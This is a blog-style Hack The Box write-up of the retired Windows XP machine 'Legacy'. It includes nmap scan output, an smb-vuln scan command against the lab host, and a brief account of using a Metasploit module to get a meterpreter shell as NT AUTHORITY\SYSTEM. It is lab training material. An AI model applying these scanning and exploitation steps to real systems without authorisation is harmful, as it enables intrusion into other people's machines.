---
layout: post
title: Legacy
date: 2020-03-30
author: th3-3inst3in
comments: true
categories: htb
tags: [windows,htb]
---

## Legacy writeup

Hi there, how you doin ?
For a long long time now I've been avoiding Hack the box cause I am sort of an addict for CTFs and I've heard that htb is one of the best playgrounds out there. I was just waiting for a time period where I could just sit down and do this without any distractions and what better time then this COVID-19 pendemic when everyone is quarantined.
Thought I'd star with retired with easy retired machines which would get me warmed up so here we are Legacy writeup.


![main]({{ site.giturl }}/MyCtfWriteups/assets/images/htb/Legacy/cover.png)


Let's do a quick nmap all ports

```bash
PORT     STATE  SERVICE       REASON          VERSION
139/tcp  open   netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  syn-ack ttl 127 Windows XP microsoft-ds
3389/tcp closed ms-wbt-server reset ttl 127
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h32m49s, deviation: 2h07m16s, median: 4d23h02m49s
| nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:4f:ab (VMware)
| Names:
|   LEGACY<00>           Flags: <unique><active>
|   HTB<00>              Flags: <group><active>
|   LEGACY<20>           Flags: <unique><active>
|   HTB<1e>              Flags: <group><active>
|   HTB<1d>              Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   00 50 56 b9 4f ab 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 40600/tcp): CLEAN (Timeout)
|   Check 2 (port 13996/tcp): CLEAN (Timeout)
|   Check 3 (port 50902/udp): CLEAN (Timeout)
|   Check 4 (port 38560/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2020-04-04T08:00:18+03:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)

```

#### Enumeration

- I ran another nmap scan `nmap -p 139,445 --script smb-vuln* 10.10.10.4` It gave me the following result sayign the SMBv1 is vulnerable to remote code execution

![smb-nmap-output]({{ site.giturl }}/MyCtfWriteups/assets/images/htb/Legacy/smb.png)

#### Exploitation

Quick google search and I found out that msf can be used to gain a shell. Used the following exploit and got an initial shell. 
After I ran getuid found out I had been dropped on to the NT Authority shell.



![shell]({{ site.giturl }}/MyCtfWriteups/assets/images/htb/Legacy/shell.png)



```bash
meterpreter > sysinfo
Computer        : LEGACY
OS              : Windows XP (5.1 Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > ls
Listing: C:\Documents and Settings\Administrator\Desktop
========================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-03-16 02:18:19 -0400  root.txt

```
That's all pretty simple